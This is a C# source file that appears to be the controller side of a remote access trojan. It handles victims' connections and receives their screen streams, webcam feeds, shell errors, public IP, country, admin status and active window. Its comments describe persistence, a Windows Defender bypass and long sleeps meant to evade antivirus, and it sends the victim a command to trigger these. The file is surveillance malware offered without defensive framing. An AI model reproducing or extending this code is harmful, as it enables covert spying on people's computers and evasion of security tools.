/*
 * Client thread loop
 * 
 * ~ Receiving data with TLV
 * ~ Event handlers
 * ~ Log connections and disconnections
 * 
 */


using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace WindowsFormsApp8
{
    public class Client
    {
        public delegate void isClientConnected();
        public delegate void screenStream(byte[] buffer);
        public delegate void GotChatMessage(byte[] buffer);
        public delegate void ErrorShellReceived(byte[] buffer);
        public delegate void LogAddValue(string type, string value, string date);
        public delegate void ListViewItemAdd(int type, Socket sck, byte[] message, int index);
        public delegate void CameraShareEvent(byte[] buffer);

        public event isClientConnected LostConnectionEvent;
        public event screenStream screenStreamEvent;
        public event GotChatMessage chatMessageEvent;
        public event ErrorShellReceived errorShellReceived;
        public event LogAddValue m_LogAddValue;
        public event ListViewItemAdd a_ListViewAction;
        public event CameraShareEvent a_CameraShareEvent;

        public string ScreenResolution;
        private bool connected = true;
        private Socket ClientSocket;
        private Main form;
        private Aes aes;
        public Client(Main form, Socket client)
        {
            this.ClientSocket = client;
            this.form = form;
            this.LostConnectionEvent = delegate { };
            this.chatMessageEvent = delegate { };
            this.screenStreamEvent = delegate { };
            this.errorShellReceived = delegate { };
            this.m_LogAddValue = delegate { };
            this.a_ListViewAction = delegate { };
            this.a_CameraShareEvent = delegate { };

            SetAesKey();
        }

        private void SetAesKey()
        {
            byte[] key = Encoding.UTF8.GetBytes("012345689ABCDEF0l123456789ABCDEF");
            this.aes = Aes.Create();
            this.aes.Key = key;
        }


        public void Receive(Socket client)
        {
            Setup(); //Persistence, WindowsDefender bypass, adding client to GUI, getting Client resolution
            this.m_LogAddValue.Invoke("[+] Client connected", client.RemoteEndPoint.ToString(), DateTime.Now.ToString());

            while (connected)
            {
                try
                {
                    byte[] tlv = read(client, 6);
                    byte type = tlv[0];
                    int lengthRead = BitConverter.ToInt32(tlv, 1);
                    byte[] data = read(client, lengthRead);

                    switch (type)
                    {
                        case 0: connected = false; break; //Logout
                        case 1: chatMessageEvent(data); break; //chat message
                        case 19: a_ListViewAction.Invoke(2, client, data, 7); break; //App opening date
                        case 17: a_ListViewAction.Invoke(2, client, data, 6); break; //Running as admin or user?
                        case 16: a_ListViewAction.Invoke(2, client, data, 5); break; //Operating system
                        case 2: a_ListViewAction.Invoke(2, client, data, 4); break; //idle Time
                        case 3: a_ListViewAction.Invoke(2, client, data, 3); break; //Current window
                        case 5: a_ListViewAction.Invoke(2, client, data, 2); break; //public IP
                        case 6: a_ListViewAction.Invoke(2, client, data, 1); break; //Country
                        case 8: screenStreamEvent(data); break; //screen share
                        case 14: errorShellReceived(data); break; //Blind shell error received
                        case 18: a_CameraShareEvent.Invoke(data); break; //Camera Sharing event
                        case 21: this.ScreenResolution = Encoding.ASCII.GetString(data); break; //client screen resolution
                    }
                }catch { }
            }
            this.m_LogAddValue.Invoke("[-] Client Disconnected", client.RemoteEndPoint.ToString(), DateTime.Now.ToString());
            a_ListViewAction.Invoke(1, client, null, default(int));
            LostConnectionEvent.Invoke();


            byte[] read(Socket c, int bytes)
            {
                byte[] buffer = new byte[bytes];
                int bytesRead = 0;
                while (bytesRead < bytes)
                    bytesRead += c.Receive(buffer, bytesRead, bytes - bytesRead, SocketFlags.None);

                return buffer;
            }
        }



        public void Send(byte[] message, byte messageType)
        {
            if (message.Length > 0)
            {
                try
                {
                    byte[] type = new byte[] { messageType };
                    byte[] mesLength = BitConverter.GetBytes(message.Length);
                    byte[] tlv = new byte[1 + 5 + message.Length];

                    Array.Copy(type, 0, tlv, 0, 1);
                    Array.Copy(mesLength, 0, tlv, 1, 4);
                    Array.Copy(message, 0, tlv, 6, message.Length);

                    //byte[] encryptedData = EncryptAes(tlv);
                    //ClientSocket.Send(encryptedData);
                    ClientSocket.Send(tlv);

                }
                catch { this.connected = false; }
            }
        }

        private byte[] EncryptAes(byte[] data)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, this.aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    return memoryStream.ToArray();
                }
            }
        }



        private void Setup()
        {
            a_ListViewAction.Invoke(0, ClientSocket, null, default(int)); //adding client to list view

            new Thread(new ThreadStart(() => //Windows defender bypass + Persistence
            {
                Thread.Sleep(60000); //Long sleeps will help bypass anti viruses
                Send(Encoding.ASCII.GetBytes("\0"), 20);
            })).Start();


            new Thread(new ThreadStart(() => //Connection test every 10 seconds
            {
                while (connected)
                {
                    Send(Encoding.ASCII.GetBytes("\0"), 100);
                    Thread.Sleep(10000);
                }
            })).Start();
        }
    }
}
